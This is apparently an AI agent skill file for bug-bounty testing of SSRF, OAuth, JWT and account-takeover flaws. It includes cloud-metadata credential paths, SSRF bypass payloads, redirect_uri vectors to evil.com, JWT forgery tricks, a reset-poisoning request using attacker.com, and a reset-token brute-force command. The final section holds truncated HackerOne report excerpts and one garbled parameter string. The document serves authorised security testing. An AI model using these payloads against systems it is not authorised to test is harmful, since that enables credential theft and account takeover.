---
name: hunt-ssrf-oauth
description: Hunt server-side request forgery, OAuth/OIDC misconfigurations, JWT attacks, and account takeover chains. Covers SSRF bypass tables (IP encodings, DNS rebinding, redirect chains, protocol smuggling), cloud metadata exploitation, OAuth redirect_uri/state/PKCE flaws, JWT algorithm confusion (alg:none, RS256→HS256, kid injection), password reset poisoning, and full ATO taxonomy. Use when testing URL-fetching features (webhooks, import-from-URL, PDF/screenshot generators, link previews), OAuth login flows, JWT-authenticated APIs, or password reset. Trigger keywords: SSRF, server-side request forgery, OAuth, OIDC, JWT, account takeover, ATO, password reset poisoning, redirect_uri, cloud metadata.
---

# SSRF / OAuth / JWT / ATO Hunting

## SSRF — Server-Side Request Forgery

SSRF is fundamentally an access control problem — the server makes requests on your behalf to resources you should not reach. It merged into Broken Access Control in OWASP 2025, but the bugs did not go away.

### Where to look (every feature that causes the server to make an outbound request)
- Webhook URLs (Slack, Discord, custom integrations)
- URL preview / link unfurling
- File import from URL (spreadsheets, images, documents)
- PDF or screenshot generation from a URL
- RSS/Atom feed readers
- OAuth callback URLs and redirect URIs
- SVG uploads containing `<image href>` / `<foreignObject>`
- XML/XXE where external entity fetches internal URL
- HTML-to-PDF converters processing `<img>`, `<iframe>`, `<link>`, CSS `url()`
- Image processing libraries following redirects from EXIF/metadata
- Email header injection triggering mail server connect to attacker host
- GraphQL/REST API params accepting URLs for avatars, storage, exports
- **API endpoints are more likely to accept raw URLs than UI forms** — prioritize them

### Detection (blind SSRF first)
```
https://<your-id>.burpcollaborator.net
https://<your-sub>.interactsh.com
```
DNS/HTTP callback = SSRF confirmed. **Time-based inference**: compare response time when pointed at different hosts (`127.0.0.1:8080` open vs `10.0.0.1:9999` filtered). Error differentiation: "connection refused" vs "connection timed out" vs "host not found" reveals network topology.

### Internal services to probe (after detection)
```
http://127.0.0.1:6379   Redis          http://127.0.0.1:8500/v1/agent/members  Consul
http://127.0.0.1:9200   Elasticsearch  http://127.0.0.1:2375                  Docker API
http://127.0.0.1:27017  MongoDB        https://kubernetes.default.svc:443/6443  K8s API
```

### Cloud metadata (payout jumps to critical)
```
AWS:  http://169.254.169.254/latest/meta-data/iam/security-credentials/
      .../ROLE-NAME  → AccessKeyId, SecretAccessKey, Token
GCP:  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
      (needs header: Metadata-Flavor: Google)
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
      (needs header: Metadata: true)
```
IMDSv2 (AWS) requires PUT + token — GET-only SSRF can't reach it, BUT if your injection point controls HTTP method AND headers (some webhook-testing features and HTML renderers do), you can bypass. Always check cloud provider docs for latest paths.

### SSRF IP Bypass Table

| Bypass | Payload | Notes |
|---|---|---|
| Decimal IP | `http://2130706433/` | 127.0.0.1 as single decimal |
| Hex IP | `http://0x7f000001/` | Hex representation |
| Octal IP | `http://0177.0.0.1/` | Octal 0177 = 127 |
| Short IP | `http://127.1/` | Abbreviated |
| IPv6 | `http://[::1]/` | Loopback IPv6 |
| IPv6-mapped | `http://[::ffff:127.0.0.1]/` | IPv4-mapped IPv6 |
| Redirect chain | `http://attacker.com/302->http://169.254.169.254` | Initial check passes, redirect not re-validated |
| DNS rebinding | Domain resolving to 127.0.0.1 | Check sees public, fetch uses internal |
| URL encoding | `http://127.0.0.1%2523@attacker.com` | Parser confusion |
| Enclosed alphanumeric | `http://①②⑦.⓪.⓪.①` | Unicode numerals |
| Protocol smuggling | `gopher://127.0.0.1:6379/_INFO` | Raw TCP to Redis/SMTP etc. |

### SSRF escalation path
1. Map every URL-fetching feature → 2. Test with callback server → 3. Try `127.0.0.1` + `169.254.169.254` → 4. If blocked, work bypass list → 5. Map internal services → 6. Attempt cloud metadata (all 3 providers) → 7. Document what credentials can access (a credential that lists S3 with customer data > one limited to CloudWatch).

### SSRF Impact Chain
- DNS-only = Informational (don't submit alone)
- Internal service accessible = Medium
- Cloud metadata readable = High
- Metadata + exfil keys = Critical (RCE on cloud)
- Docker API = Critical (direct RCE)

## OAuth / OIDC

- [ ] Missing `state` parameter → CSRF (login CSRF)
- [ ] `redirect_uri` accepts wildcards / open redirect → ATO
- [ ] Missing PKCE → auth code interception (especially mobile/native apps)
- [ ] Implicit flow → token leakage in referrer
- [ ] Open redirect in post-auth redirect → OAuth token theft chain
- [ ] Auth code replay (code used twice) → token theft
- [ ] Account linking without email verification → ATO via OAuth
- [ ] `response_mode=query` leaking tokens into referrer/logs

### redirect_uri test vectors
```
https://target.com/oauth/callback
https://target.com/oauth/callback@evil.com
https://evil.com
https://evil.com#@target.com
https://target.com.evil.com
https://target.com/../evil.com
```

## JWT Attacks

| Attack | Test |
|---|---|
| alg=none | Set header `{"alg":"none"}`, empty signature |
| Weak HMAC secret | `hashcat -m 16500 jwt.txt rockyou.txt` |
| kid injection | `{"kid":"../../../../../../dev/null"}` path traversal; SQLi in kid |
| Algorithm confusion | Force HS256 with server's RSA public key as HMAC secret |
| Missing validation | Remove signature entirely — accepted? |
| Expiration bypass | Set `exp` far future, or remove `exp`/`iat` |
| Claim tampering | Flip `role`, `admin`, `user_id`, `org_id` claims |

## ATO — Account Takeover Taxonomy

### Path 1: Password Reset Poisoning (Host header injection)
```
POST /forgot-password
Host: attacker.com
email=victim@company.com
```
Reset link = `https://attacker.com/reset?token=XXXX` → ATO. Also try `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`.

### Path 2: Reset token in Referrer leak
External resource on the reset page → token in Referer header to external domain.

### Path 3: Predictable / weak reset tokens
```bash
# token < 16 hex chars or numeric only = brute-forceable
ffuf -u "https://target.com/reset?token=FUZZ" -w <(seq -w 000000 999999) -fc 404 -t 50
```

### Path 4: Token not expiring / reuse
Request token → wait 2h → use → still works? Request #1 and #2 → use #1 after #2 requested?

### Path 5: Email change without re-auth
```
PUT /api/user/email  {"new_email": "attacker@evil.com"}
```
No current_password required → attacker changes email → locks out victim → ATO.

### Path 6: OAuth account linking abuse
Link OAuth account from a different email to an existing account?

### Path 7: Session fixation
GET /login → note Set-Cookie session=XYZ → login → does session ID change? If not = fixation.

## Host Header Injection
- Try `Host: evil.com` and observe reflected host in password reset links, redirects, cache keys
- Alone = rejected. Chain with password reset poisoning → ATO (valid)

## PARAMETER COVERAGE — SSRF probes on EVERY param (MANDATORY)
The #1 miss: only testing url-named params (url/src/dest/feed/webhook) and
skipping every other string param. SSRF hides in IDs that become fetch targets
(`?document_id=` → fetch from storage), image/resize params, avatar/logo
upload-by-URL, import-from-URL, PDF export, link preview, RSS refresh, and
headers (Referer, X-Forwarded-For) that some fetchers honor.

1. **Enumerate** every query key, path segment, JSON/form key (recursive),
   header, and cookie on every endpoint that could cause an outbound request —
   and on endpoints that LOOK inert too (a fetch may be triggered server-side
   by an ID).
2. **On EACH parameter run the SSRF ladder**:
   - collaborator HTTP+DNS: `https://<sub>.interactsh.com` / burpcollaborator
   - loopback: `http://127.0.0.1/`, `http://localhost/`, `http://[::1]/`
   - cloud metadata (all three): AWS `169.254.169.254/...`, GCP (with
     `Metadata-Flavor: Google`), Azure (with `Metadata: true`)
   - internal ports to time-diff (open vs filtered) for blind SSRF
3. **If the param type is numeric/ID**, test it as a fetch target anyway
   (convert to `http://127.0.0.1` via type confusion when the API accepts
   objects/URLs).
4. **WAF/block → bypass ladder** (decimal/hex/octal/short IP, IPv6-mapped,
   redirect chain, DNS rebinding, encoding), never drop the param.
5. **OAuth surface**: test redirect_uri validation on the authorize endpoint
   with the full vector set (`evil.com`, `@evil.com`, `.evil.com`,
   `evil.com#@target`, path traversal, scheme swap, query/fragment addition)
   AND state/ PKCE behavior.
6. **Track** `endpoint → param → probe → callback?` in the journal; unique
   collaborator sub-tag per param; unlogged param = gap.

## FIELD DATA — mined from HackerOne disclosed reports (10k-report corpus)

### Class: ssrf — 206 disclosed H1 reports (76 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `url`
- `id`
- `image_host`
- `AAAAAAVVAacibcMeQaa-JKcUyH-R0itjt2o5kIUgVaclQb7SjFgL4eFSChKpRUFWw5I6mpFBaG331jUn5d3UQLI_WQvnxl7pF0SjzIKjWb9DdUnLhg`
- `alt`
- `name`
- `type`
- `sentry_key`
- `sessionid`
- `sessionId`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] SSRF to AWS file read** (Server-Side Request Forgery (SSRF))
  - Signal: ## Summary: after seeing the disclosure it looks like the bug was not fixed properly ## Steps To Reproduce: copy and paste the request below and paste it into Burpsuite repeater `G
- **[critical] Full Read SSRF on Gitlab's Internal Grafana** (Server-Side Request Forgery (SSRF))
  - Signal: Apparently, Grafana is bundled with Gitlab by default. So the grafana instance that is accessible via `/-/grafana/`is vulnerable to the SSRF outlined below. ## Summary By chaining 
- **[critical] SSRF in Functional Administrative Support Tool pdf generator (████) [HtUS]** (Server-Side Request Forgery (SSRF))
  - Signal: ## Summary: I found that it is possible to inject a javascript payload during the PDF form creation process, which is then executed by the checklist application server. ## Vulnerab
- **[critical] [Uppy] Internal Server side request forgery (bypass of #786956)** (Server-Side Request Forgery (SSRF))
  - Signal: I would like to report `Internal Server-side request forgery` in Uppy It allows the attacker to easily extract information from internal servers # Module **module name:** Uppy **ve

### Class: oauth — 176 disclosed H1 reports (50 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `client_id`
- `redirect_uri`
- `state`
- `response_type`
- `scope`
- `code`
- `oauth_token`
- `next`
- `consumer_key`
- `host`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] Authentication bypass on auth.uber.com via subdomain takeover of saostatic.uber.com** (Improper Authentication - Generic)
  - Signal: ## Summary This is not a standard vulnerability, but a chain of two more exotic vulnerabilities leading to a full authentication bypass of your SSO login system at auth.uber.com (v
- **[critical] One-click account hijack for anyone using Apple sign-in with Reddit, due to response-type switch + leaking href to XSS on www.redditmedia.com** (Improper Access Control - Generic)
  - Signal: Hi, # Description I've been researching new ways to steal OAuth codes and access-tokens using postMessage, and I found a way for me to steal the code and/or access-token from Apple
- **[critical] ██████████ vulnerable to CVE-2022-22954** (Code Injection)
  - Signal: I found that one of the targets belongs to **DOD** vulnerable to **CVE-2022-22954** where an attacker may be able to execute any malicious code like escalating Remote code executio
- **[critical] Leaking sensitive information on Github lead full access to all Grab Slack channels** (Information Disclosure)
  - Signal: #Summary: Accidental leakage of secret keys in such code repositories is a real problem, after my report #387117, I decided to dig deeper than the previous report and looking to so

